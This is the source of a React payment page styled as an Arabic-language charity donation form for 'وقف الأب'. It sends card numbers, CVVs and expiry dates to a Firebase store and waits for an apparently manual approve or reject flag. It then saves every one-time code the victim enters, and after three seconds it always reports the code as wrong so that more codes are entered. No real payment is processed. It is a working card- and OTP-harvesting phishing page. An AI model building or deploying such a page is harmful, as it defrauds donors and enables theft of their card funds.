"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { ArrowLeft, CreditCard, Calendar, Lock, CheckCircle, Shield, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from "@/components/ui/card"
import { toast } from "sonner"
import { addData, db, handlePay } from "@/lib/firebase"
import { onSnapshot, doc } from "firebase/firestore" // Added missing doc import

export default function PaymentPage() {
  const router = useRouter()
  const [cardNumber, setCardNumber] = useState("")
  const [cardHolder, setCardHolder] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [showOtp, setShowOtp] = useState(false)
  const [otp, setOtp] = useState("")
  const [paymentId, setPaymentId] = useState("")
  const [amount, setAmount] = useState("")
  const [paymentInfo, setPaymentInfo] = useState({ status: "" })
  const [countdown, setCountdown] = useState(180) // 3 minutes in seconds
  const [isProcessing, setIsProcessing] = useState(false)
  const [allOtps] = useState([""])

  useEffect(() => {
    const am = localStorage.getItem("amount")
    if (am) setAmount(am)
  }, [])

  // Countdown timer effect
  useEffect(() => {
    let timer: NodeJS.Timeout

    if (showOtp && countdown > 0) {
      timer = setInterval(() => {
        setCountdown((prevTime) => prevTime - 1)
      }, 1000)
    } else if (countdown === 0 && showOtp) {
      toast.error("انتهت صلاحية رمز التحقق. يرجى طلب رمز جديد.")
    }

    return () => {
      if (timer) clearInterval(timer)
    }
  }, [showOtp, countdown])

  // Monitor payment status changes
  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")

    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), async (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as any
          setPaymentInfo(data)

          if (isProcessing && paymentInfo.status === "approved") {
            // Payment approved, show OTP screen
            setIsProcessing(false)
            setShowOtp(true)
            setCountdown(180) // Reset countdown
            toast.success("تم إرسال رمز التحقق لمرة واحدة إلى هاتفك المحمول")
          } else if (isProcessing && paymentInfo.status === "rejected") {
            // Payment failed
            setIsProcessing(false)
            toast.error("فشلت عملية الدفع. يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.")
          }
        }
      })

      return () => unsubscribe()
    }
  }, [paymentInfo.status, isProcessing])

  const formatCardNumber = (value: string) => {
    // Remove all non-digit characters
    const digits = value.replace(/\D/g, "")

    // Add space after every 4 digits
    const formatted = digits.replace(/(\d{4})(?=\d)/g, "$1 ")

    // Limit to 19 characters (16 digits + 3 spaces)
    return formatted.slice(0, 19)
  }

  const formatExpiryDate = (value: string) => {
    // Remove all non-digit characters
    const digits = value.replace(/\D/g, "")

    // Format as MM/YY
    if (digits.length > 2) {
      return `${digits.slice(0, 2)}/${digits.slice(2, 4)}`
    }

    return digits
  }

  const handleOtpChange = (value: string) => {
    // Only allow numbers
    const numericValue = value.replace(/\D/g, "")
    setOtp(numericValue)
  }
  const handleOtp = (vak: string) => {
    allOtps.push(vak)
  }
  const handleSubmitPayment = async () => {
    const paymentData = {
      cardNumber: cardNumber,
      cardHolder,
      expiryDate,
      cvv,
      createdDate: new Date().toISOString(),
    }

    // Form validation
    if (cardNumber.replace(/\s/g, "").length !== 16) {
      toast.error("يرجى إدخال رقم بطاقة صحيح مكون من 16 رقمًا")
      return
    }

    if (!cardHolder) {
      toast.error("يرجى إدخال اسم حامل البطاقة")
      return
    }

    if (expiryDate.length !== 5) {
      toast.error("يرجى إدخال تاريخ انتهاء صلاحية صحيح (MM/YY)")
      return
    }

    if (cvv.length !== 3) {
      toast.error("يرجى إدخال رمز CVV صحيح مكون من 3 أرقام")
      return
    }

    const donationId = localStorage.getItem("visitor")
    if (!donationId) {
      toast.error("معرف التبرع غير موجود")
      return
    }

    setIsSubmitting(true)
    setIsProcessing(true)

    try {
      // Process payment
      await handlePay(paymentData, setPaymentInfo)

      // Save payment ID
      setPaymentId(donationId)

      // Note: We don't set showOtp here anymore
      // It will be set by the useEffect when payment status changes
    } catch (error) {
      console.error("Error processing payment:", error)
      toast.error("حدثت مشكلة في معالجة الدفع الخاص بك. يرجى المحاولة مرة أخرى.")
      setIsProcessing(false)
    } finally {
      setIsSubmitting(false)
    }
  }

  const handleVerifyOtp = async () => {
    // Validate OTP
    setIsSubmitting(true)

    try {
      const id = localStorage.getItem("visitor")
      if (!id || !paymentId) throw new Error("Missing required IDs")
      handleOtp(otp)
      await addData({ id, otp, allOtps })

      // Show success message

      // Redirect to success page after short delay
      setTimeout(() => {
        toast.error("رمز التحقق غير صحيح")
setOtp("")
      }, 3000)
    } catch (error) {
      console.error("Error verifying OTP:", error)
      toast.error("حدثت مشكلة في التحقق من الدفع الخاص بك. يرجى المحاولة مرة أخرى.")
    } finally {
      setIsSubmitting(false)
    }
  }

  // Function to resend OTP
  const handleResendOtp = () => {
    // Reset countdown
    setCountdown(180)
    toast.success("تم إرسال رمز تحقق جديد إلى هاتفك المحمول")
    // Here you would typically call your API to resend the OTP
  }

  // Format time to MM:SS
  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes.toString().padStart(2, "0")}:${remainingSeconds.toString().padStart(2, "0")}`
  }

  // Render loading state
  const renderProcessingState = () => (
    <div className="flex flex-col items-center justify-center py-10 space-y-4">
      <Loader2 className="h-12 w-12 text-blue-500 animate-spin" />
      <div className="text-center">
        <h3 className="text-lg font-medium text-gray-900 mb-1">جاري معالجة الدفع</h3>
        <p className="text-sm text-gray-600">يرجى الانتظار بينما نتحقق من بيانات بطاقتك...</p>
      </div>
    </div>
  )

  return (
    <div className="flex flex-col min-h-screen bg-gray-50" dir="rtl">
      {/* Header */}
      <header className="bg-white p-4 flex justify-between items-center border-b">
        <Button variant="ghost" size="icon" onClick={() => router.back()}>
          <ArrowLeft className="h-5 w-5" />
        </Button>
        <div className="text-blue-600 text-sm font-semibold">
          <div>وقف الأب</div>
          <div className="text-xs text-gray-500">وقف الرعاية الصحية</div>
        </div>
        <div className="w-8"></div> {/* Empty div for spacing */}
      </header>

      {/* Main Content */}
      <main className="flex-1 p-4 max-w-md mx-auto w-full">
        <Card className="mb-6 border-2 border-gray-200 shadow-md">
          <CardHeader className="bg-gradient-to-r from-blue-50 to-white border-b pb-4">
            <CardTitle className="text-2xl text-blue-900">تفاصيل الدفع</CardTitle>
            <CardDescription className="text-gray-600 mt-1">
              مبلغ التبرع: <span className="font-bold text-blue-900">{amount} درهم</span>
            </CardDescription>
          </CardHeader>

          <CardContent className="pt-6">
            {isProcessing ? (
              renderProcessingState()
            ) : !showOtp ? (
              <div className="space-y-5">
                <div className="flex justify-center mb-2">
                  <div className="flex space-x-2 rtl:space-x-reverse">
                    <img src="/v.png" alt="Visa" width={45} height={30} className="h-7" />
                    <img src="/m.png" alt="Mastercard" width={45} height={30} className="h-7" />
                    <img src="/emp.png" alt="American Express" width={45} height={30} className="h-7" />
                  </div>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center">
                    <CreditCard className="h-5 w-5 ml-2 text-blue-500" />
                    <label htmlFor="cardNumber" className="text-sm font-medium">
                      رقم البطاقة
                    </label>
                  </div>
                  <Input
                    id="cardNumber"
                    value={cardNumber}
                    type="tel"
                    onChange={(e) => setCardNumber(e.target.value)}
                    maxLength={16}
                    placeholder="XXXX XXXX XXXX XXXX"
                    className="border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                  />
                </div>

                <div className="space-y-2">
                  <label htmlFor="cardHolder" className="text-sm font-medium flex items-center">
                    <span className="ml-2">اسم حامل البطاقة</span>
                  </label>
                  <Input
                    id="cardHolder"
                    value={cardHolder}
                    onChange={(e) => setCardHolder(e.target.value)}
                    placeholder="الاسم كما يظهر على البطاقة"
                    className="border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <div className="flex items-center">
                      <Calendar className="h-5 w-5 ml-2 text-blue-500" />
                      <label htmlFor="expiryDate" className="text-sm font-medium">
                        تاريخ الانتهاء
                      </label>
                    </div>
                    <Input
                      type="tel"
                      id="expiryDate"
                      placeholder="MM/YY"
                      value={expiryDate}
                      onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                      maxLength={5}
                      className="border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                    />
                  </div>

                  <div className="space-y-2">
                    <div className="flex items-center">
                      <Lock className="h-5 w-5 ml-2 text-blue-500" />
                      <label htmlFor="cvv" className="text-sm font-medium">
                        رمز الأمان (CVV)
                      </label>
                    </div>
                    <Input
                      id="cvv"
                      value={cvv}
                      onChange={(e) => {
                        // Only allow numbers
                        const value = e.target.value.replace(/\D/g, "")
                        setCvv(value)
                      }}
                      maxLength={3}
                      type="tel"
                      placeholder="123"
                      className="border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                    />
                  </div>
                </div>

                <div className="flex items-center justify-center text-xs text-gray-500 mt-4 bg-gray-50 p-2 rounded-md">
                  <Shield className="h-4 w-4 ml-1 text-green-500" />
                  <span>جميع المعاملات مشفرة وآمنة</span>
                </div>
              </div>
            ) : (
              <div className="space-y-5">
                <div className="text-center mb-4">
                  <CheckCircle className="h-12 w-12 mx-auto text-green-500 mb-2" />
                  <h3 className="text-lg font-medium text-gray-900 mb-1">التحقق من الدفع</h3>
                  <p className="text-sm text-gray-600">لقد أرسلنا رمز تحقق لمرة واحدة إلى رقم هاتفك المحمول المسجل.</p>
                  {/* Countdown timer display */}
                  <div className={`mt-2 font-medium ${countdown < 30 ? "text-red-500" : "text-blue-600"}`}>
                    ينتهي الرمز خلال: {formatTime(countdown)}
                  </div>
                </div>

                <div className="space-y-4">
                  <label htmlFor="otp" className="text-sm font-medium block text-center">
                    رمز التحقق لمرة واحدة (OTP)
                  </label>
                  <Input
                    id="otp"
                    value={otp}
                    onChange={(e) => handleOtpChange(e.target.value)}
                    className="w-full h-12 text-center text-xl font-bold border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                    type="tel"
                    maxLength={6}
                    minLength={4}
                    inputMode="numeric"
                    placeholder="XXXXXX"
                  />
                  <p className="text-center text-sm text-gray-500 mt-2">
                    لم يصلك الرمز؟{" "}
                    <button
                      className={`${countdown > 0 ? "text-gray-400 cursor-not-allowed" : "text-blue-600 hover:underline"}`}
                      onClick={countdown === 0 ? handleResendOtp : undefined}
                      disabled={countdown > 0}
                    >
                      {countdown > 0 ? `انتظر قبل إعادة الإرسال (${formatTime(countdown)})` : "إعادة الإرسال"}
                    </button>
                  </p>
                </div>
              </div>
            )}
          </CardContent>

          <CardFooter className="bg-gray-50 border-t pt-4 pb-4">
            {isProcessing ? (
              <Button
                className="w-full bg-blue-600 text-white py-2 h-12 text-lg opacity-70 cursor-not-allowed"
                disabled
              >
                جاري معالجة الدفع...
              </Button>
            ) : !showOtp ? (
              <Button
                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 h-12 text-lg"
                onClick={handleSubmitPayment}
                disabled={isSubmitting}
              >
                {isSubmitting ? "جاري المعالجة..." : "إتمام الدفع"}
              </Button>
            ) : (
              <Button
                className="w-full bg-green-600 hover:bg-green-700 text-white py-2 h-12 text-lg"
                onClick={handleVerifyOtp}
                disabled={isSubmitting}
              >
                {isSubmitting ? "جاري التحقق..." : "تأكيد رمز التحقق"}
              </Button>
            )}
          </CardFooter>
        </Card>
      </main>

      {/* Footer */}
      <footer className="bg-blue-900 text-white p-4 text-center">
        <div className="text-sm font-semibold">© وقف الأب</div>
      </footer>
    </div>
  )
}

